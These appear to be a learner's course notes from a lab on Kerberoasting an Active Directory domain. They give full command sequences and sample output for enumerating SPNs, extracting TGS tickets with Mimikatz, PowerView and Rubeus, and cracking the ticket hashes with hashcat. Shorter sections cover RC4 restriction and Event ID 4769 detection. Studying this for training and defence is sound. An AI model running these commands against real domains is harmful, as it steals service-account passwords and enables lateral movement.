# Kerberoasting - Semi Manual method

## ==Enumerating SPNs (Service Principal Names)==

**Tool:** `setspn.exe`

> [!important]
> 
> ```PowerShell
> setspn.exe -Q */*
> ```

- Identifies user and service accounts with SPNs
- Filter out computer accounts

- ==**Example**==
    
    ```Bash
    C:\htb> setspn.exe -Q */*
    
    Checking domain DC=INLANEFREIGHT,DC=LOCAL
    CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
            exchangeAB/ACADEMY-EA-DC01
            exchangeAB/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
            TERMSRV/ACADEMY-EA-DC01
            TERMSRV/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
            Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
            ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL
            ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DomainDnsZones.INLANEFREIGHT.LOCAL
    
    <SNIP>
    
    CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
            backupjob/veam001.inlanefreight.local
    CN=SOLARWINDSMONITOR,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
            sts/inlanefreight.local
    
    <SNIP>
    
    CN=sqlprod,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
            MSSQLSvc/SPSJDB.inlanefreight.local:1433
    CN=sqlqa,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
            MSSQLSvc/SQL-CL01-01inlanefreight.local:49351
    CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
            MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
    CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
            adfsconnect/azure01.inlanefreight.local
    
    Existing SPN found!
    ```
    

## **Targeting a Single User - Requesting TGS Tickets**

> [!important] **Tool:** PowerShell + .NET

> [!important]
> 
> ```PowerShell
> Add-Type -AssemblyName System.IdentityModel
> 
> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
> ```

- Loads the TGS ticket into memory
- Can request tickets for a single user or loop through all

## **Retrieving All Tickets Using setspn.exe**

> [!important]
> 
> ```Bash
> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
> ```

- Output
    
    ```Bash
    Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-3
    SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
    ValidFrom            : 2/24/2022 11:56:18 PM
    ValidTo              : 2/25/2022 8:55:25 AM
    ServicePrincipalName : exchangeAB/ACADEMY-EA-DC01
    SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
    
    Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-4
    SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
    ValidFrom            : 2/24/2022 11:56:18 PM
    ValidTo              : 2/24/2022 11:58:18 PM
    ServicePrincipalName : kadmin/changepw
    SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
    
    Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-5
    SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
    ValidFrom            : 2/24/2022 11:56:18 PM
    ValidTo              : 2/25/2022 8:55:25 AM
    ServicePrincipalName : WSMAN/ACADEMY-EA-MS01
    SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
    
    <SNIP>
    ```
    

---

# Extracting Tickets Using Mimikatz

- Now that the tickets are loaded, we can use `Mimikatz` to extract the ticket(s) from `memory`.

> [!important]
> 
> ```Plain
> base64 /out:true
> 
> kerberos::list /export
> ```

- Dumps tickets from memory

- Outputs `.kirbi` files or Base64 blobs
    
    ```Bash
    Using 'mimikatz.log' for logfile : OK
    
    mimikatz # base64 /out:true
    isBase64InterceptInput  is false
    isBase64InterceptOutput is true
    
    mimikatz # kerberos::list /export  
    
    <SNIP>
    
    [00000002] - 0x00000017 - rc4_hmac_nt      
       Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM
       Server Name       : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL
       Client Name       : htb-student @ INLANEFREIGHT.LOCAL
       Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
    ====================
    Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
    ====================
    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
    ZWZyZWlnaHQubG9jYWw6MTQzMw==
    ====================
    
       * Saved to file     : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
    
    <SNIP>
    ```
    

### **Prepare Base64 for Cracking:**

```Bash
echo "<base64 blob>" | tr -d '\n'
```

We can place the above single line of output into a file and convert it back to a `.kirbi` file using the `base64` utility.

## **Placing the Output into a File as .kirbi**

```Bash
cat encoded_file | base64 -d > sqldev.kirbi
```

## **Extracting the Kerberos Ticket using kirbi2john.py**

```Bash
python2.7 kirbi2john.py sqldev.kirbi
```

This will create a file called `crack_file`. We then must modify the file a bit to be able to use Hashcat against the hash.

## **Modifiying crack_file for Hashcat**

```Bash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

OR 

```
echo '$krb5tgs$23$*23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local*$1433*$59D5D5F704DB07
                       99C5CA044E094F6EBB$8440AA5E380B5BA5BAE0150AFA5F988832AE60F7D0D84FA4DE6AB7D31543775CBE0CF33233C4A
                       7C3A0C97EB8993CBBA24A63192CBEA0C48CA8CC35411546B9D16B026FEBE0C35FD3E430E863FA48737FF43F3DD108609
                       6B47559E765E517205864224078EE0E0226849CAD75F7C8FE5E8E7FEA0A32970498A5BA6E640738D554D76FF10EDD075
                       A36EAE5154AAF5A99A328FFD781CB122DCF7B549BED063765D964493BA72A6F09DD8A644A928686B5D97CD311E16390E
                       F0CE45361BD3CE1E14205A5366C270376B7B5D4AC8FD089E10F9E552077ADACA664FDCB38A6D059D80839A5CB3C9CAA5
                       1AA4CC9BF1D3D3034812FDD4657C9567FB392AD0AA99F0EC3B5C18D86B9260A989B03013DDBBD5D8D562B56C843B050C
                       5B846CC157EE2A371A5E802899B7BBB24A3744172E7932E4BC0D15E6E9855CC6F095BF189BC83B3615BD934DB7F4785B
                       F18E121324CEAE30C52F403EAAC2E9FF79222C4C6606C1532EAD19BE17BB162601A403A48C140EE35A814F74AF146D31
                       E3D390AE2255261AE5C484917F9E02A04A1A154A8A543E0753BE390DD0D3D2D98A605CB29F521F73E245433622ED6210
                       195D3A0E320B30BB29279E9950CFC1D7CFFEBF5FDA777C2912217F8A31F51DE3A8B2D3822B1AC9B82FDF9D7AFAF38F5E
                       82695A00C6F33E207D4A91D9E8233DCE38EB33276769871D88A19D0F3B7F2985D7063ACA064894866C48B19779AFADC7
                       BFD353BDA6BF3652D57D8B00E8DF707BA5D8163691FE7AB84992143C17B9E02A996B2B4AAF6CABFE0D1C1A478258A294
                       83FDD40ADC2B979838D42F99EB96C7DA120ABA83C7FAF07079862B384EBD97B809C6BA6FB99683CCD2C9693A5A0E4404
                       6BE4ED6BBC5B4038567209EC5F804A3446C0D0127343F038D12867435FC89946FC39832590B8BF9B7E5E77EE2C12F0AA
                       EFB89C7CA940021392C96900703C6D8D9BAC766BC3B4E0898095261813E5C81FD6D312E68F95A16F3AA23F858B1A4F4C
                       A8674E0C43A57516029A5B0DE6D5567846FC4AB4F49692F215415E88788D929757B59A8FDC0EE8F5E3AEBD304CD16D45
                       19B3EF882554667FB2AC9987BAF40512C4E08D6CAA120AAD48F4FFBA1A6E01547DA42BEB908E8C898E106C8B2BBC0CE5
                       A73D5792FC2D9F6B9337993F27F4C5100FACC9987F170EB7510D6DD668A92CBDC1FDCD3850E381B97A92446C0138E0E2
                       875B33ADE0B24285C24D1D87097B5C209E9A48FB87D0D2F11CBD6D3EB37A7B221636239AEF7D5110C4005324DA1DED07
                       AF1BA5EE3EC056DCBDA027821DDF80ECB28B88E5D49A74C1965C191333A8CF80909A90BEDC8CFC79FAFDE69A9D1B44ED
                       58A7106F47652E8CC4070FB17FD1155A1FE4587204530715B1184645E2C4D74CC742E4644C6D787FD65A62CA28F8442D
                       7DF0E3A775BBBA5C8945798AAD738920EA05D2A8A826B7118D03C7E75D90E329984131FF3C753B1D247DD2947B68CA32
                       6CBCEEE43D494587428F7550B46B5CDB5432E56329DD67AB371821C6B47C59BC44F' | tr -d "[:space:]" > tgs_file
```
## **Viewing the Prepared Hash**

```Bash
cat sqldev_tgs_hashcat
```

## **Cracking the Hash with Hashcat**

```Bash
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

---

# Automated / Tool Based Route

> [!important] Much Quicker Way of Kerberoasting using automated tools

## PowerView

### **Using PowerView to Enumerate SPN Accounts**

```Bash
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname
```

> From here, we could target a specific user and retrieve the TGS ticket in Hashcat format.

### **Using PowerView to Target a Specific User**

```Bash
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

- Example
    
    ```Bash
    PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
    
    SamAccountName       : sqldev
    DistinguishedName    : CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
    ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
    TicketByteHexStream  :
    Hash                 : $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433*$BF9729001
                           376B63C5CAC933493C58CE7$4029DBBA2566AB4748EDB609CA47A6E7F6E0C10AF50B02D10A6F92349DDE3336018DE177
                           AB4FF3CE724FB0809CDA9E30703EDDE93706891BCF094FE64387B8A32771C7653D5CFB7A70DE0E45FF7ED6014B5F769F
                           DC690870416F3866A9912F7374AE1913D83C14AB51E74F200754C011BD11932464BEDA7F1841CCCE6873EBF0EC5215C0
                           12E1938AEC0E02229F4C707D333BD3F33642172A204054F1D7045AF3303809A3178DD7F3D8C4FB0FBB0BB412F3BD5526
                           7B1F55879DFB74E2E5D976C4578501E1B8F8484A0E972E8C45F7294DA90581D981B0F177D79759A5E6282D86217A03A9
                           ADBE5EEB35F3924C84AE22BBF4548D2164477409C5449C61D68E95145DA5456C548796CC30F7D3DDD80C48C84E3A538B
                           019FB5F6F34B13859613A6132C90B2387F0156F3C3C45590BBC2863A3A042A04507B88FD752505379C42F32A14CB9E44
                           741E73285052B70C1CE5FF39F894412010BAB8695C8A9BEABC585FC207478CD91AE0AD03037E381C48118F0B65D25847
                           B3168A1639AF2A534A63CF1BC9B1AF3BEBB4C5B7C87602EEA73426406C3A0783E189795DC9E1313798C370FD39DA53DD
                           CFF32A45E08D0E88BC69601E71B6BD0B753A10C36DB32A6C9D22F90356E7CD7D768ED484B9558757DE751768C99A64D6
                           50CA4811D719FC1790BAE8FE5DB0EB24E41FF945A0F2C80B4C87792CA880DF9769ABA2E87A1ECBF416641791E6A762BF
                           1DCA96DDE99D947B49B8E3DA02C8B35AE3B864531EC5EE08AC71870897888F7C2308CD8D6B820FCEA6F584D1781512AC
                           089BFEFB3AD93705FDBA1EB070378ABC557FEA0A61CD3CB80888E33C16340344480B4694C6962F66CB7636739EBABED7
                           CB052E0EAE3D7BEBB1E7F6CF197798FD3F3EF7D5DCD10CCF9B4AB082CB1E199436F3F271E6FA3041EF00D421F4792A0A
                           DCF770B13EDE5BB6D4B3492E42CCCF208873C5D4FD571F32C4B761116664D9BADF425676125F6BF6C049DD067437858D
                           0866BE520A2EBFEA077037A59384A825E6AAA99F895A58A53313A86C58D1AA803731A849AE7BAAB37F4380152F790456
                           37237582F4CA1C5287F39986BB233A34773102CB4EAE80AFFFFEA7B4DCD54C28A824FF225EA336DE28F4141962E21410
                           D66C5F63920FB1434F87A988C52604286DDAD536DA58F80C4B92858FE8B5FFC19DE1B017295134DFBE8A2A6C74CB46FF
                           A7762D64399C7E009AA60B8313C12D192AA25D3025CD0B0F81F7D94249B60E29F683B797493C8C2B9CE61B6E3636034E
                           6DF231C428B4290D1BD32BFE7DC6E7C1E0E30974E0620AE337875A54E4AFF4FD50C4785ADDD59095411B4D94A094E87E
                           6879C36945B424A86159F1575042CB4998F490E6C1BC8A622FC88574EB2CF80DD01A0B8F19D8F4A67C942D08DCCF23DD
                           92949F63D3B32817941A4B9F655A1D4C5F74896E2937F13C9BAF6A81B7EEA3F7BC7C192BAE65484E5FCCBEE6DC51ED9F
                           05864719357F2A223A4C48A9A962C1A90720BBF92A5C9EEB9AC1852BC3A7B8B1186C7BAA063EB0AA90276B5D91AA2495
                           D29D545809B04EE67D06B017C6D63A261419E2E191FB7A737F3A08A2E3291AB09F95C649B5A71C5C45243D4CEFEF5EED
                           95DDD138C67495BDC772CFAC1B8EF37A1AFBAA0B73268D2CDB1A71778B57B02DC02628AF11
    ```
    

### **Exporting All Tickets to a CSV File**

```Bash
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

### **Viewing the Contents of the .CSV File**

```Bash
cat .\ilfreight_tgs.csv
```

## Using Rubeus

### Running Rubeus

```Bash
.\Rubeus.exe
```

- Important
    
    > [!important] It is worth scrolling through the menu, familiarizing yourself with the options, and reading up on the various other possible tasks. Some options include:
    > 
    > - Performing Kerberoasting and outputting hashes to a file
    > - Using alternate credentials
    > - Performing Kerberoasting combined with a pass-the-ticket attack
    > - Performing "opsec" Kerberoasting to filter out AES-enabled accounts
    > - Requesting tickets for accounts passwords set between a specific date range
    > - Placing a limit on the number of tickets requested
    > - Performing AES Kerberoasting
    

### **Using the /stats Flag**

```Bash
.\Rubeus.exe kerberoast /stats
```

### Rubeus to request Admin Account

```Bash
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

### Rubeus **Using the /tgtdeleg Flag**

> [!important] We can use Rubeus with the `/tgtdeleg` flag to specify that we want only RC4 encryption

```Bash
.\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap
```

# About Kerberoasting Encryption - The Difference between RC4 and AES

> [!important]
> 
> - Kerberoasting attacks typically request **RC4-encrypted TGS tickets** (etype 23) because RC4 is weaker and easier to crack offline with tools like Hashcat. These hashes usually begin with `$krb5tgs$23$*`.
> - In some cases, **AES-128 (etype 17) or AES-256 (etype 18)** encrypted tickets are returned (e.g., `$krb5tgs$18$*`), which are much **slower to crack**, though still possible—especially if weak passwords are used.

# Defending Against Kerberoasting

## ==Restrict RC4==

- **Kerberos encryption types can be configured** via Group Policy under:
    
    _Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options >_ **Network security: Configure encryption types allowed for Kerberos**.
    
- **Limiting to RC4_HMAC_MD5 enables downgrade attacks**, but removing AES weakens security and disabling RC4 may break functionality—**changes should be thoroughly tested** before implementation.

![[Notion/CPTS/RESOURCES/image 21.png|image 21.png]]

## ==Log Kerberos TGS Tickets==

- **Mitigation:** Use strong, non-dictionary passwords for non-managed service accounts, or preferably implement **MSA/gMSA or LAPS**, which generate complex, auto-rotating passwords to reduce Kerberoasting risk.
- **Detection:** Monitor for **abnormal volumes of RC4-encrypted TGS-REQ/TGS-REP traffic**, especially **Event ID 4769**. A high frequency of these events from a single user may indicate Kerberoasting activity.
- **Logging:** Enable **Audit Kerberos Service Ticket Operations** in Group Policy to log Event IDs **4769 (ticket requested)** and **4770 (ticket renewed)**, helping detect suspicious ticket requests and potential account compromise.

![[image 1 13.png|image 1 13.png]]

---

# **Continuing Onwards**

> [!important] Now that we have a set of (hopefully privileged) credentials, we can move on to see where we can use the credentials. We may be able to:
> 
> - Access a host via RDP or WinRM as a local user or a local admin
> - Authenticate to a remote host as an admin using a tool such as PsExec
> - Gain access to a sensitive file share
> - Gain MSSQL access to a host as a DBA user, which can then be leveraged to escalate privileges